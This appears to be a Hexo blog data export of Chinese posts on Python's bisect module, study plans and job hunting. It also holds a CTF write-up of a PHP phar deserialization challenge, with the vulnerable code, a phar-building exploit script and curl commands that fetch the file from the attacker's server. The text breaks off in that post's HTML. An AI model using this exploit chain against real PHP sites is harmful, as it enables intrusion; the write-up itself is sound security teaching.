hi=len(a))<br>将x插入有序序列a内，并保持有序状态。相当于a.insert(bisect.bisect_left(a, x, lo, hi), x)。碰到相同的元素则插入到元素的左边。这个操作通常是 O(log n) 的时间复杂度。<br>bisect.insort_right(a, x, lo=0, hi=len(a))<br>同上，只不过碰到相同的元素则插入到元素的右边。<br>bisect.insort(a, x, lo=0, hi=len(a))<br>等同于insort_right()。</p>\n<h2 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h2><p>官方文档中给出了一个简单实用例子和<br>利用利用bisect模块实现通用的列表元素查询方法的示范<br>文档链接：<br><a href=\"https://docs.python.org/3/library/bisect.html\" target=\"_blank\" rel=\"noopener\">https://docs.python.org/3/library/bisect.html</a><br>可以自行食用</p>\n<h2 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h2><p>源码<br><a href=\"https://github.com/python/cpython/blob/3.8/Lib/bisect.py\" target=\"_blank\" rel=\"noopener\">https://github.com/python/cpython/blob/3.8/Lib/bisect.py</a><br>最近比较喜欢阅读官方文档和源码，很多教程写来写去也没说明白不如直接去看官方示例<br>所以除了最基本解释就不写了，大家可以直接看源码感受一下</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天突然在网上看到的库，可以快速排序，叫做bisect<br>bisect模块实现了二分查找和插入算法，短小精干，简单易用</p>\n<h2 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h2><p>我们首先来看看官方文档<br>This module provides support for maintaining a list in sorted order without having to sort the list after each insertion. For long lists of items with expensive comparison operations, this can be an improvement over the more common approach. The module is called bisect because it uses a basic bisection algorithm to do its work. The source code may be most useful as a working example of the algorithm (the boundary conditions are already right!).<br>重点:支持安排序顺序维护列表，使用二分查找方法提速，源码或许是最有用的工程算法实现(hhh官方吹捧<br>Ps - 使用此库前请保证list有序<br>Bisect 是二分法的意思，这里使用二分法来排序，它会将一个元素插入到一个有序列表的合适位置，这使得不需要每次调用 sort 的方式维护有序列表。</p>\n<h2 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h2><p>bisect模块采用经典的二分算法查找元素。模块提供下面几个方法：<br>bisect.bisect_left(a, x, lo=0, hi=len(a))<br>定位x在序列a中的插入点，并保持原来的有序状态不变。参数lo和hi用于指定查找区间。如果x已经存在于a中，那么插入点在已存在元素的左边。函数的返回值是列表的整数下标。<br>bisect.bisect_right(a, x, lo=0, hi=len(a))<br>和上面的区别是插入点在右边。函数的返回值依然是一个列表下标整数。<br>bisect.bisect(a, x, lo=0, hi=len(a))<br>等同于bisect_right()。<br>注意，前面这三个方法都是获取插入位置，也就是列表的某个下标的，并不实际插入。但下面三个方法实际插入元素，没有返回值。<br>bisect.insort_left(a, x, lo=0, hi=len(a))<br>将x插入有序序列a内，并保持有序状态。相当于a.insert(bisect.bisect_left(a, x, lo, hi), x)。碰到相同的元素则插入到元素的左边。这个操作通常是 O(log n) 的时间复杂度。<br>bisect.insort_right(a, x, lo=0, hi=len(a))<br>同上，只不过碰到相同的元素则插入到元素的右边。<br>bisect.insort(a, x, lo=0, hi=len(a))<br>等同于insort_right()。</p>\n<h2 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h2><p>官方文档中给出了一个简单实用例子和<br>利用利用bisect模块实现通用的列表元素查询方法的示范<br>文档链接：<br><a href=\"https://docs.python.org/3/library/bisect.html\" target=\"_blank\" rel=\"noopener\">https://docs.python.org/3/library/bisect.html</a><br>可以自行食用</p>\n<h2 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h2><p>源码<br><a href=\"https://github.com/python/cpython/blob/3.8/Lib/bisect.py\" target=\"_blank\" rel=\"noopener\">https://github.com/python/cpython/blob/3.8/Lib/bisect.py</a><br>最近比较喜欢阅读官方文档和源码，很多教程写来写去也没说明白不如直接去看官方示例<br>所以除了最基本解释就不写了，大家可以直接看源码感受一下</p>\n"},{"title":"清明日常","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2020-04-05T13:38:58.000Z","password":null,"summary":null,"_content":"\n最近最大的收获是发现了极客时间这个宝藏平台，里面教程的内容普遍比较高。刚刚看完《Go语言从入门到实战》比B站的那些培训班资源讲的还是要深刻不少，我很喜欢。今天看了几节Linux实战，和Git三剑客。都不错，但是在后续日常他们优先度将不会太高。\n\n后续优先学习数据结构和算法之美，然后是MySQL实战。\n\n关于Caffe中s2vt的使用，现使用docker+cpu模式进行s2vt的训练，目前断断续续已经运行一天还没出结果...\n\n如果明天还没有出结果，将使用GPU模式进行模型训练，要是出结果了就写一篇博客记录一下\n\n","source":"_posts/清明日常.md","raw":"---\ntitle: 清明日常\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2020-04-05 21:38:58\npassword:\nsummary:\ntags:\ncategories:\n---\n\n最近最大的收获是发现了极客时间这个宝藏平台，里面教程的内容普遍比较高。刚刚看完《Go语言从入门到实战》比B站的那些培训班资源讲的还是要深刻不少，我很喜欢。今天看了几节Linux实战，和Git三剑客。都不错，但是在后续日常他们优先度将不会太高。\n\n后续优先学习数据结构和算法之美，然后是MySQL实战。\n\n关于Caffe中s2vt的使用，现使用docker+cpu模式进行s2vt的训练，目前断断续续已经运行一天还没出结果...\n\n如果明天还没有出结果，将使用GPU模式进行模型训练，要是出结果了就写一篇博客记录一下\n\n","slug":"清明日常","published":1,"updated":"2020-04-05T14:00:06.149Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckcxigxt600044zm92r7tfj3x","content":"<p>最近最大的收获是发现了极客时间这个宝藏平台，里面教程的内容普遍比较高。刚刚看完《Go语言从入门到实战》比B站的那些培训班资源讲的还是要深刻不少，我很喜欢。今天看了几节Linux实战，和Git三剑客。都不错，但是在后续日常他们优先度将不会太高。</p>\n<p>后续优先学习数据结构和算法之美，然后是MySQL实战。</p>\n<p>关于Caffe中s2vt的使用，现使用docker+cpu模式进行s2vt的训练，目前断断续续已经运行一天还没出结果…</p>\n<p>如果明天还没有出结果，将使用GPU模式进行模型训练，要是出结果了就写一篇博客记录一下</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近最大的收获是发现了极客时间这个宝藏平台，里面教程的内容普遍比较高。刚刚看完《Go语言从入门到实战》比B站的那些培训班资源讲的还是要深刻不少，我很喜欢。今天看了几节Linux实战，和Git三剑客。都不错，但是在后续日常他们优先度将不会太高。</p>\n<p>后续优先学习数据结构和算法之美，然后是MySQL实战。</p>\n<p>关于Caffe中s2vt的使用，现使用docker+cpu模式进行s2vt的训练，目前断断续续已经运行一天还没出结果…</p>\n<p>如果明天还没有出结果，将使用GPU模式进行模型训练，要是出结果了就写一篇博客记录一下</p>\n"},{"title":"秋招近期安排","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2020-07-22T14:43:07.000Z","password":null,"summary":null,"_content":"\n终于也迎来了自己的秋招\n\n最近好好刷一刷leetcode,再像春招被算法题问倒就扇死自己!哼!\n现在的技术栈数据库偏弱,安全也没挖出来过src,也会机器学习\n\n现在感觉最好的路线是安全开发.其次后端,最后自己会kafka,hdfs,spark这些也可以考虑大数据\n但是没几家招安全开发的,后端Go+Python技术栈,spark不会深层知识=.=可以说不太乐观\n\n优势是,写的代码多,会的方向多\n缺点是没有方向超级拔尖,少年全科80+,大厂不需要同时会这么多方向\n\n安全开发>后端>大数据\n\n最后moka体验很差,先写好个人简历模版以后,投递具体公司时,简历会把模版自动顶替掉,又要重新写!\n","source":"_posts/秋招近期安排.md","raw":"---\ntitle: 秋招近期安排\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2020-07-22 22:43:07\npassword:\nsummary:\ntags:\ncategories:\n---\n\n终于也迎来了自己的秋招\n\n最近好好刷一刷leetcode,再像春招被算法题问倒就扇死自己!哼!\n现在的技术栈数据库偏弱,安全也没挖出来过src,也会机器学习\n\n现在感觉最好的路线是安全开发.其次后端,最后自己会kafka,hdfs,spark这些也可以考虑大数据\n但是没几家招安全开发的,后端Go+Python技术栈,spark不会深层知识=.=可以说不太乐观\n\n优势是,写的代码多,会的方向多\n缺点是没有方向超级拔尖,少年全科80+,大厂不需要同时会这么多方向\n\n安全开发>后端>大数据\n\n最后moka体验很差,先写好个人简历模版以后,投递具体公司时,简历会把模版自动顶替掉,又要重新写!\n","slug":"秋招近期安排","published":1,"updated":"2020-07-22T15:01:09.707Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckcxigxt700054zm9f2t35g88","content":"<p>终于也迎来了自己的秋招</p>\n<p>最近好好刷一刷leetcode,再像春招被算法题问倒就扇死自己!哼!<br>现在的技术栈数据库偏弱,安全也没挖出来过src,也会机器学习</p>\n<p>现在感觉最好的路线是安全开发.其次后端,最后自己会kafka,hdfs,spark这些也可以考虑大数据<br>但是没几家招安全开发的,后端Go+Python技术栈,spark不会深层知识=.=可以说不太乐观</p>\n<p>优势是,写的代码多,会的方向多<br>缺点是没有方向超级拔尖,少年全科80+,大厂不需要同时会这么多方向</p>\n<p>安全开发&gt;后端&gt;大数据</p>\n<p>最后moka体验很差,先写好个人简历模版以后,投递具体公司时,简历会把模版自动顶替掉,又要重新写!</p>\n","site":{"data":{}},"excerpt":"","more":"<p>终于也迎来了自己的秋招</p>\n<p>最近好好刷一刷leetcode,再像春招被算法题问倒就扇死自己!哼!<br>现在的技术栈数据库偏弱,安全也没挖出来过src,也会机器学习</p>\n<p>现在感觉最好的路线是安全开发.其次后端,最后自己会kafka,hdfs,spark这些也可以考虑大数据<br>但是没几家招安全开发的,后端Go+Python技术栈,spark不会深层知识=.=可以说不太乐观</p>\n<p>优势是,写的代码多,会的方向多<br>缺点是没有方向超级拔尖,少年全科80+,大厂不需要同时会这么多方向</p>\n<p>安全开发&gt;后端&gt;大数据</p>\n<p>最后moka体验很差,先写好个人简历模版以后,投递具体公司时,简历会把模版自动顶替掉,又要重新写!</p>\n"},{"title":"伍佰计划","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2020-03-24T16:14:32.000Z","password":null,"summary":null,"_content":"\n引经据典，轮子哥说过，代码并不是一件困难的事情，一百万行代码足以。\n\n上周亲自尝试了这个方法，发现自己每天也就只能写200行代码。\n\n所以在能力没有达到时，果断降低自己心理期望不失为一种策略，计划每天早起1个leetcode\n\n今天12:30上床睡觉，明天5:50起床干活\n\n从每天开始，早起锻炼10min，跑步20min。然后开始刷算法！\n\n每天缺乏引导！从今天的博客开始","source":"_posts/伍佰计划.md","raw":"---\ntitle: 伍佰计划\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2020-03-25 00:14:32\npassword:\nsummary:\ntags:\ncategories:\n---\n\n引经据典，轮子哥说过，代码并不是一件困难的事情，一百万行代码足以。\n\n上周亲自尝试了这个方法，发现自己每天也就只能写200行代码。\n\n所以在能力没有达到时，果断降低自己心理期望不失为一种策略，计划每天早起1个leetcode\n\n今天12:30上床睡觉，明天5:50起床干活\n\n从每天开始，早起锻炼10min，跑步20min。然后开始刷算法！\n\n每天缺乏引导！从今天的博客开始","slug":"伍佰计划","published":1,"updated":"2020-03-24T16:14:11.712Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckcxigxt800064zm928782x27","content":"<p>引经据典，轮子哥说过，代码并不是一件困难的事情，一百万行代码足以。</p>\n<p>上周亲自尝试了这个方法，发现自己每天也就只能写200行代码。</p>\n<p>所以在能力没有达到时，果断降低自己心理期望不失为一种策略，计划每天早起1个leetcode</p>\n<p>今天12:30上床睡觉，明天5:50起床干活</p>\n<p>从每天开始，早起锻炼10min，跑步20min。然后开始刷算法！</p>\n<p>每天缺乏引导！从今天的博客开始</p>\n","site":{"data":{}},"excerpt":"","more":"<p>引经据典，轮子哥说过，代码并不是一件困难的事情，一百万行代码足以。</p>\n<p>上周亲自尝试了这个方法，发现自己每天也就只能写200行代码。</p>\n<p>所以在能力没有达到时，果断降低自己心理期望不失为一种策略，计划每天早起1个leetcode</p>\n<p>今天12:30上床睡觉，明天5:50起床干活</p>\n<p>从每天开始，早起锻炼10min，跑步20min。然后开始刷算法！</p>\n<p>每天缺乏引导！从今天的博客开始</p>\n"},{"title":"网络安全:反序列化问题","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2020-06-07T04:41:53.000Z","password":null,"summary":null,"_content":"\n( ｡ớ ₃ờ)ھ经典反序列化问题,今天遇到了一个反序列化问题，最后一步连续踩坑...着实很难受(自己太菜了)！ \n话不多说我们先来看一看题目：\n\n```php\n<?php\nif (!file_exists(\"/var/www/data/secret\")) {\n   $SECRET = randomkeys(16);\n   file_put_contents(\"/var/www/data/secret\", $SECRET);\n} else {\n   $SECRET = file_get_contents(\"/var/www/data/secret\");\n}\nif (isset($_SERVER[\"HTTP_X_REAL_IP\"])) $SERVER_IP = $_SERVER[\"HTTP_X_REAL_IP\"];\nelse $SERVER_IP = $_SERVER[\"REMOTE_ADDR\"];\n$SANDBOX = \"/var/www/data/\" . base64_encode(\"ctf\" . $SERVER_IP);    // 根据 remote_addr 给每个人创建一个沙盒\n@mkdir($SANDBOX);\n@chdir($SANDBOX);\n\nif (!isset($_COOKIE[\"session-data\"])) {\n   $data = serialize(new User($SANDBOX));\n   $hmac = hash_hmac(\"sha1\", $data, $SECRET);    //将每个人唯一的沙盒对象加上签名后作为 session-data\n   setcookie(\"session-data\", sprintf(\"%s-----%s\", $data, $hmac));\n}\n\nclass User {\n   public $avatar;\n   function __construct($path) {\n       $this->avatar = $path;    //设置了头像的路径为沙盒路径\n  }\n}\n\nclass Admin extends User {\n   function __destruct() {\n       $_GET[\"lucky\"]();\n  }\n}\n\nfunction randomkeys($length){   \n   $output='';   \n   for ($a = 0; $a<$length; $a++) {   \n       $output .= chr(mt_rand(0, 0xFF));    //生成php随机数   \n    }   \n    return $output;   \n}   \n\nfunction getFlag() {\n   $flag = file_get_contents(\"/flag\");\n   echo $flag;\n}\n\nfunction check_session() {\n   global $SECRET;\n   $data = $_COOKIE[\"session-data\"];\n   list($data, $hmac) = explode(\"-----\", $data, 2);\n   if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) {\n       die(\"Bye\");\n  }\n   if (!hash_equals(hash_hmac(\"sha1\", $data, $SECRET), $hmac)) {\n       die(\"Bye Bye\");\n  }\n   $data = unserialize($data);    //判断身份，如果身份正确返回头像路径(沙盒路径)\n   if (!isset($data->avatar)) {    //该函数不可绕过\n       die(\"Bye Bye Bye\");\n  }\n   return $data->avatar;\n}\n\nfunction upload($path) {    //获取头像，检查头是否为GIF89a ，正确后存入沙盒\n   $data = file_get_contents($_GET[\"url\"] . \"/avatar.gif\");\n   if (substr($data, 0, 6) !== \"GIF89a\") {    //这个就是利用 phar:// 进行反序列化的点\n       die(\"Fuck off\");\n  }\n   file_put_contents($path . \"/avatar.gif\", $data);\n   die(\"Upload OK\");\n}\n\nfunction show($path) {    //获取这个沙盒中的头像\n   if (!file_exists($path . \"/avatar.gif\")) {\n       $path = \"/var/www/html\";\n  }\n   header(\"Content-Type: image/gif\");\n   die(file_get_contents($path . \"/avatar.gif\"));\n}\n\n$mode = $_GET[\"m\"];\nif ($mode == \"upload\") {\n   upload(check_session());\n} else if ($mode == \"show\") {\n   show(check_session());\n} else {\n   highlight_file(__FILE__);\n}\n```\n\n## 简述\n\n这道题是根据经典题目进行的改编，进行了简化，关键位置已经加上了注释。原题目为Orange 在 2017 年 hitcon 上面出的利用 Phar 进行反序列化。\n题目很简短，接下来就让我们一起分析一下这道题。\n题目简析\n\n这是一个反序列化的题目。但是当年这道题全球0解，原因是用户认证部分不可以绕过，如果我们想要利用unserailize()，通过控制参数去实现反序列化，必须先绕过cookie检验。\n但是cookie是通过remote_addr配合sha1进行hmac签名生成的，几乎不可能绕过，当时做题的人统统沉迷于此，才最终全球0解。\n另辟蹊径\n\n## 利用思路\n\n我们使用 Phar 反序列化的条件有三点\n(1)文件上传点\n(2)系统文件函数\n(3) phar:// 伪协议\n\n可以看到 upload 函数，完美契合我们的要求，我们此时只要精心构造一个包含Admin对象和avatar.gif文件，并且起始为 GIF89a 的phar文件传上去，下一次通过Phar://协议让file_get_contents 请求这个文件就可以实现我们对 Admin 对象的反序列化了！\n\n程序示例：\n```php\n<?php\nclass Admin {\n   public $avatar = 'orz';  \n} \n$p = new Phar(__DIR__ . '/avatar.phar', 0);\n$p['file.php'] = '<?php ?>';\n$p->setMetadata(new Admin());\n$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');\nrename(__DIR__ . '/avatar.phar', __DIR__ . '/avatar.gif');\n?>\n```\n\n解题过程\n\n```shell\ncurl http://hostname --cookie-jar cookie\n返回 ： ... 无关紧要\ncurl -b cookie 'http://hostname?m=upload&url=http://你的服务器host'\n返回：Upload OK%\ncurl -b cookie 'http://hostname?m=upload&url=phar:///var/www/data/（ctf + 本地IP）base64编码&lucky=getFlag\n```\n\n返回：flag\n即可解出～！！(*･ω･)\n\n## 题目回顾\n\n在2020年做这种题目网上题解一艘一堆，直接初步定位题目类型简简单单，但是具体一些细节也会让你很难直接做对\n首先这道题是base64不是md5，有的人看完原题直接就用md5，老老实实看题还是有必要的\n此外这道题没有用到匿名函数，省去了写脚本的步骤，降低了难度\n太久没看php最近都在看Go，看见'ctf' . 'ip' 以为是一个类或者结构体的属性....(是拼接啊喂！基础啊老哥！！！)\n最后（ctf + 本地IP）base64 直接在浏览器，Brupsuite，POSTMAN都可以很明确的获取到，这里也是本人实力眼瞎没有看到...其实！！！题目里明明写了是ctf和IP拼接！！！啊啊啊！！这个错误耗时3小时，最后还是交流了一下才发现没加....一个刻骨铭心的错误Otz\n这道题每个用户可以彼此空间隔离，不会出现一个上传，全体白嫖的现象，妙啊\n\n## 尾言\n\n遇到自己一小时解决不了的问题还是交流一下比较好，没有交流很容易自闭hhh\n最后BiliBili贴代码怎么自动高光，需要后续研究一下=。=手动变色太麻烦了\n有哪里想交流随时留言！！感觉安全方面学习交流还是比没有代码那么方便，欢迎交流啊～\n\n## 参考文献\n\n如果想要深入学习反序列化，为各位推荐一个大大大佬的博文\nhttps://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面\n\n","source":"_posts/网络安全-反序列化问题.md","raw":"---\ntitle: '网络安全:反序列化问题'\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2020-06-07 12:41:53\npassword:\nsummary:\ntags:\ncategories:\n---\n\n( ｡ớ ₃ờ)ھ经典反序列化问题,今天遇到了一个反序列化问题，最后一步连续踩坑...着实很难受(自己太菜了)！ \n话不多说我们先来看一看题目：\n\n```php\n<?php\nif (!file_exists(\"/var/www/data/secret\")) {\n   $SECRET = randomkeys(16);\n   file_put_contents(\"/var/www/data/secret\", $SECRET);\n} else {\n   $SECRET = file_get_contents(\"/var/www/data/secret\");\n}\nif (isset($_SERVER[\"HTTP_X_REAL_IP\"])) $SERVER_IP = $_SERVER[\"HTTP_X_REAL_IP\"];\nelse $SERVER_IP = $_SERVER[\"REMOTE_ADDR\"];\n$SANDBOX = \"/var/www/data/\" . base64_encode(\"ctf\" . $SERVER_IP);    // 根据 remote_addr 给每个人创建一个沙盒\n@mkdir($SANDBOX);\n@chdir($SANDBOX);\n\nif (!isset($_COOKIE[\"session-data\"])) {\n   $data = serialize(new User($SANDBOX));\n   $hmac = hash_hmac(\"sha1\", $data, $SECRET);    //将每个人唯一的沙盒对象加上签名后作为 session-data\n   setcookie(\"session-data\", sprintf(\"%s-----%s\", $data, $hmac));\n}\n\nclass User {\n   public $avatar;\n   function __construct($path) {\n       $this->avatar = $path;    //设置了头像的路径为沙盒路径\n  }\n}\n\nclass Admin extends User {\n   function __destruct() {\n       $_GET[\"lucky\"]();\n  }\n}\n\nfunction randomkeys($length){   \n   $output='';   \n   for ($a = 0; $a<$length; $a++) {   \n       $output .= chr(mt_rand(0, 0xFF));    //生成php随机数   \n    }   \n    return $output;   \n}   \n\nfunction getFlag() {\n   $flag = file_get_contents(\"/flag\");\n   echo $flag;\n}\n\nfunction check_session() {\n   global $SECRET;\n   $data = $_COOKIE[\"session-data\"];\n   list($data, $hmac) = explode(\"-----\", $data, 2);\n   if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) {\n       die(\"Bye\");\n  }\n   if (!hash_equals(hash_hmac(\"sha1\", $data, $SECRET), $hmac)) {\n       die(\"Bye Bye\");\n  }\n   $data = unserialize($data);    //判断身份，如果身份正确返回头像路径(沙盒路径)\n   if (!isset($data->avatar)) {    //该函数不可绕过\n       die(\"Bye Bye Bye\");\n  }\n   return $data->avatar;\n}\n\nfunction upload($path) {    //获取头像，检查头是否为GIF89a ，正确后存入沙盒\n   $data = file_get_contents($_GET[\"url\"] . \"/avatar.gif\");\n   if (substr($data, 0, 6) !== \"GIF89a\") {    //这个就是利用 phar:// 进行反序列化的点\n       die(\"Fuck off\");\n  }\n   file_put_contents($path . \"/avatar.gif\", $data);\n   die(\"Upload OK\");\n}\n\nfunction show($path) {    //获取这个沙盒中的头像\n   if (!file_exists($path . \"/avatar.gif\")) {\n       $path = \"/var/www/html\";\n  }\n   header(\"Content-Type: image/gif\");\n   die(file_get_contents($path . \"/avatar.gif\"));\n}\n\n$mode = $_GET[\"m\"];\nif ($mode == \"upload\") {\n   upload(check_session());\n} else if ($mode == \"show\") {\n   show(check_session());\n} else {\n   highlight_file(__FILE__);\n}\n```\n\n## 简述\n\n这道题是根据经典题目进行的改编，进行了简化，关键位置已经加上了注释。原题目为Orange 在 2017 年 hitcon 上面出的利用 Phar 进行反序列化。\n题目很简短，接下来就让我们一起分析一下这道题。\n题目简析\n\n这是一个反序列化的题目。但是当年这道题全球0解，原因是用户认证部分不可以绕过，如果我们想要利用unserailize()，通过控制参数去实现反序列化，必须先绕过cookie检验。\n但是cookie是通过remote_addr配合sha1进行hmac签名生成的，几乎不可能绕过，当时做题的人统统沉迷于此，才最终全球0解。\n另辟蹊径\n\n## 利用思路\n\n我们使用 Phar 反序列化的条件有三点\n(1)文件上传点\n(2)系统文件函数\n(3) phar:// 伪协议\n\n可以看到 upload 函数，完美契合我们的要求，我们此时只要精心构造一个包含Admin对象和avatar.gif文件，并且起始为 GIF89a 的phar文件传上去，下一次通过Phar://协议让file_get_contents 请求这个文件就可以实现我们对 Admin 对象的反序列化了！\n\n程序示例：\n```php\n<?php\nclass Admin {\n   public $avatar = 'orz';  \n} \n$p = new Phar(__DIR__ . '/avatar.phar', 0);\n$p['file.php'] = '<?php ?>';\n$p->setMetadata(new Admin());\n$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');\nrename(__DIR__ . '/avatar.phar', __DIR__ . '/avatar.gif');\n?>\n```\n\n解题过程\n\n```shell\ncurl http://hostname --cookie-jar cookie\n返回 ： ... 无关紧要\ncurl -b cookie 'http://hostname?m=upload&url=http://你的服务器host'\n返回：Upload OK%\ncurl -b cookie 'http://hostname?m=upload&url=phar:///var/www/data/（ctf + 本地IP）base64编码&lucky=getFlag\n```\n\n返回：flag\n即可解出～！！(*･ω･)\n\n## 题目回顾\n\n在2020年做这种题目网上题解一艘一堆，直接初步定位题目类型简简单单，但是具体一些细节也会让你很难直接做对\n首先这道题是base64不是md5，有的人看完原题直接就用md5，老老实实看题还是有必要的\n此外这道题没有用到匿名函数，省去了写脚本的步骤，降低了难度\n太久没看php最近都在看Go，看见'ctf' . 'ip' 以为是一个类或者结构体的属性....(是拼接啊喂！基础啊老哥！！！)\n最后（ctf + 本地IP）base64 直接在浏览器，Brupsuite，POSTMAN都可以很明确的获取到，这里也是本人实力眼瞎没有看到...其实！！！题目里明明写了是ctf和IP拼接！！！啊啊啊！！这个错误耗时3小时，最后还是交流了一下才发现没加....一个刻骨铭心的错误Otz\n这道题每个用户可以彼此空间隔离，不会出现一个上传，全体白嫖的现象，妙啊\n\n## 尾言\n\n遇到自己一小时解决不了的问题还是交流一下比较好，没有交流很容易自闭hhh\n最后BiliBili贴代码怎么自动高光，需要后续研究一下=。=手动变色太麻烦了\n有哪里想交流随时留言！！感觉安全方面学习交流还是比没有代码那么方便，欢迎交流啊～\n\n## 参考文献\n\n如果想要深入学习反序列化，为各位推荐一个大大大佬的博文\nhttps://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面\n\n","slug":"网络安全-反序列化问题","published":1,"updated":"2020-07-22T14:30:51.713Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckcxigxt900074zm961mqbd5z","content":"<p>( ｡ớ ₃ờ)ھ经典反序列化问题,今天遇到了一个反序列化问题，最后一步连续踩坑…着实很难受(自己太菜了)！<br>话不多说我们先来看一看题目：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!file_exists(<span class=\"string\">\"/var/www/data/secret\"</span>)) &#123;</span><br><span class=\"line\">   $SECRET = randomkeys(<span class=\"number\">16</span>);</span><br><span class=\"line\">   file_put_contents(<span class=\"string\">\"/var/www/data/secret\"</span>, $SECRET);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">   $SECRET = file_get_contents(<span class=\"string\">\"/var/www/data/secret\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">\"HTTP_X_REAL_IP\"</span>])) $SERVER_IP = $_SERVER[<span class=\"string\">\"HTTP_X_REAL_IP\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">else</span> $SERVER_IP = $_SERVER[<span class=\"string\">\"REMOTE_ADDR\"</span>];</span><br><span class=\"line\">$SANDBOX = <span class=\"string\">\"/var/www/data/\"</span> . base64_encode(<span class=\"string\">\"ctf\"</span> . $SERVER_IP);    <span class=\"comment\">// 根据 remote_addr 给每个人创建一个沙盒</span></span><br><span class=\"line\">@mkdir($SANDBOX);</span><br><span class=\"line\">@chdir($SANDBOX);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">\"session-data\"</span>])) &#123;</span><br><span class=\"line\">   $data = serialize(<span class=\"keyword\">new</span> User($SANDBOX));</span><br><span class=\"line\">   $hmac = hash_hmac(<span class=\"string\">\"sha1\"</span>, $data, $SECRET);    <span class=\"comment\">//将每个人唯一的沙盒对象加上签名后作为 session-data</span></span><br><span class=\"line\">   setcookie(<span class=\"string\">\"session-data\"</span>, sprintf(<span class=\"string\">\"%s-----%s\"</span>, $data, $hmac));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> $avatar;</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($path)</span> </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">$this</span>-&gt;avatar = $path;    <span class=\"comment\">//设置了头像的路径为沙盒路径</span></span><br><span class=\"line\">  &#125;</span><br><span 